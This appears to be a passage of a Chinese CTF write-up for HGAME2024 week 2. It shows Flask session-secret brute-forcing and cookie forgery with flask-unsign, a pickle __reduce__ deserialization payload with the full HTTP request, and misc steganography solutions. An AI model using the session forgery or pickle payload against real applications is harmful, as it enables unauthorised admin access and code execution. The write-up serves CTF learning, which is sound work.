+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flask-unsign  --unsign --cookie &#34;eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zc8itA.-x96nzpnRAmc-tQCxN5uxYLhlQA&#34; --no-literal-eval --wordlist 000000-999999.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165501808.png" title="image-20240216165501808" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165501808.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165501808.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165501808.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165501808.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165501808.png 2x"
+            sizes="auto"
+            alt="image-20240216165501808">
+    </a></figure></p>
+<p>得到SECRET_KEY为165350并进行session伪造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flask-unsign --sign --cookie &#34;{&#39;username&#39;: &#39;admin&#39;}&#34; --secret 165350 --no-literal-eval
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将cookie写入浏览器，访问<code>/flag</code>接口进行验证</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165958482.png" title="image-20240216165958482" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165958482.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165958482.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165958482.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165958482.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165958482.png 2x"
+            sizes="auto"
+            alt="image-20240216165958482">
+    </a></figure></p>
+<p><strong>pickle反序列化rce</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># For POST requests from admin</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pickle_data</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;pickle_data&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Tips: Here try to trigger RCE</span>
+</span></span><span class="line"><span class="cl">        <span class="n">userdata</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">userdata</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用POST方法请求<code>/flag</code>接口，程序使用<code>pickle.dumps</code>方法反序列化提交的<code>pickle_data</code>参数，并返回反序列化结果</p>
+<p>构造<code>__reduce__</code>方法进行rce</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlencode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">myflaskrce</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="p">(</span><span class="nb">open</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">myflaskrce</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl"><span class="n">post_params</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;pickle_data&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">urlencode</span><span class="p">(</span><span class="n">post_params</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行脚本，得到payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>随后发包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/flag</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">139.196.183.57:32139</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Zc8ulQ.hoc3E0E5-vcmVRCr9gVve05SKG4</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216174805888.png" title="image-20240216174805888" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216174805888.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216174805888.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216174805888.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216174805888.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216174805888.png 2x"
+            sizes="auto"
+            alt="image-20240216174805888">
+    </a></figure></p>
+<h3 id="search4member" class="headerLink">
+    <a href="#search4member" class="header-mark"></a>[search4member]</h3><h2 id="misc" class="headerLink">
+    <a href="#misc" class="header-mark"></a>misc</h2><h3 id="ek1ng_want_girlfriend" class="headerLink">
+    <a href="#ek1ng_want_girlfriend" class="header-mark"></a>[ek1ng_want_girlfriend]</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png" title="image-20240208015452309" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png 2x"
+            sizes="auto"
+            alt="image-20240208015452309">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015513833.png" title="image-20240208015513833" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015513833.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015513833.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015513833.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015513833.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015513833.png 2x"
+            sizes="auto"
+            alt="image-20240208015513833">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/ek1ng.jpg" title="ek1ng" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/ek1ng.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/ek1ng.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/ek1ng.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/ek1ng.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/ek1ng.jpg 2x"
+            sizes="auto"
+            alt="ek1ng">
+    </a></figure></p>
+<p>hgame{ek1ng_want_girlfriend_qq_761042182}</p>
+<h3 id="ezword" class="headerLink">
+    <a href="#ezword" class="header-mark"></a>[ezWord]</h3><p>将docx文件后缀改为zip并解压</p>
+<p>在<code>\attachment\这是一个word文件\word\media</code>文件发现提示</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175555070.png" title="image-20240216175555070" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175555070.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175555070.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175555070.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175555070.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175555070.png 2x"
+            sizes="auto"
+            alt="image-20240216175555070">
+    </a></figure></p>
+<p>根据<code>恭喜.txt</code>推测为双图隐写</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175756724.png" title="image-20240216175756724" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175756724.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175756724.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175756724.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175756724.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175756724.png 2x"
+            sizes="auto"
+            alt="image-20240216175756724">
+    </a></figure></p>
+<p>得到解压密码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220223103455.png" title="image-20240220223103455" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220223103455.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220223103455.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220223103455.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220223103455.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220223103455.png 2x"
+            sizes="auto"
+            alt="image-20240220223103455">
+    </a></figure></p>
+<p><code>T1hi3sI4sKey</code></p>
+<p>解压后得到secret.txt文本</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175946885.png" title="image-20240216175946885" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175946885.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175946885.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175946885.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175946885.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175946885.png 2x"
+            sizes="auto"
+            alt="image-20240216175946885">
+    </a></figure></p>
+<p>根据文本特征推测为垃圾邮件编码</p>
+<p><a href="https://www.spammimic.com/decode.shtml" target="_blank" rel="noopener noreferrer">https://www.spammimic.com/decode.shtml</a></p>
+<p>得到文本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ROT-8000解码</p>
+<p><a href="https://www.dcode.fr/chiffre-rot8000" target="_blank" rel="noopener noreferrer">Chiffre ROT8000 - Déchiffrer, Decoder, Encoder en Ligne (dcode.fr)</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216182410764.png" title="image-20240216182410764" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216182410764.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216182410764.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216182410764.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216182410764.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216182410764.png 2x"
+            sizes="auto"
+            alt="image-20240216182410764">
+    </a></figure></p>
+<h3 id="龙之舞" class="headerLink">
+    <a href="#%e9%be%99%e4%b9%8b%e8%88%9e" class="header-mark"></a>[龙之舞]</h3><p>音频的频谱分析，发现可疑信息</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224207409.png" title="image-20240220224207409" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224207409.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224207409.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224207409.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224207409.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224207409.png 2x"
+            sizes="auto"
+            alt="image-20240220224207409">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224258688.png" title="image-20240220224258688" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224258688.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224258688.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224258688.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224258688.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224258688.png 2x"
+            sizes="auto"
+            alt="image-20240220224258688">
+    </a></figure></p>
+<p>进行反转和镜像</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220230602050.png" title="image-20240220230602050" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220230602050.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220230602050.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220230602050.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220230602050.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220230602050.png 2x"
+            sizes="auto"
+            alt="image-20240220230602050">
+    </a></figure></p>
+<p>KEY:5H8w1nlWCX3hQLG</p>
+<p>使用deepsound工具</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231007803.png" title="image-20240220231007803" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231007803.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231007803.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231007803.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231007803.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231007803.png 2x"
+            sizes="auto"
+            alt="image-20240220231007803">
+    </a></figure></p>
+<p>提取出XXX.zip并解压，得到gif文件，会看到有二维码闪烁</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231241931.png" title="image-20240220231241931" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231241931.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231241931.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231241931.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231241931.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231241931.png 2x"
+            sizes="auto"
+            alt="image-20240220231241931">
+    </a></figure></p>
+<p>对gif文件进行逐帧提取</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231451147.png" title="image-20240220231451147" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231451147.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231451147.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231451147.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231451147.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231451147.png 2x"
+            sizes="auto"
+            alt="image-20240220231451147">
+    </a></figure></p>
+<p>拼合二维码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232326502.png" title="image-20240220232326502" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232326502.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232326502.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232326502.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232326502.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232326502.png 2x"
+            sizes="auto"
+            alt="image-20240220232326502">
+    </a></figure></p>
+<p>对二维码进行修复</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232846437.png" title="image-20240220232846437" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232846437.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232846437.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232846437.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232846437.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232846437.png 2x"
+            sizes="auto"
+            alt="image-20240220232846437">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png" title="image-20240220232903853" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png 2x"
+            sizes="auto"
+            alt="image-20240220232903853">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png" title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png 2x"
+            sizes="auto"
+            alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232921777.png" title="image-20240220232921777" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232921777.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232921777.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232921777.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232921777.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232921777.png 2x"
+            sizes="auto"
+            alt="image-20240220232921777">
+    </a></figure></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-02-14</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/hgame2024_week2/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\HGAME2024_week2.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\HGAME2024_week2.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20HGAME2024_week2_wp&body=|Field|Value|%0A|-|-|%0A|Title|HGAME2024_week2_wp|%0A|Url|http://scofield1920.github.io/hgame2024_week2/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\HGAME2024_week2.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/hgame2024_week2/" data-title="HGAME2024_week2_wp" data-hashtags="CTF,wp"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/hgame2024_week2/" data-hashtag="CTF"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/hgame2024_week2/" data-title="HGAME2024_week2_wp"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/hgame2024_week2/" data-title="HGAME2024_week2_wp"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/hgame2024_week2/" data-title="HGAME2024_week2_wp"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/hgame2024_week2/" data-title="HGAME2024_week2_wp" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;HGAME2024_week2_wp&#34;, &#34;http://scofield1920.github.io/hgame2024_week2/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/wp/">wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
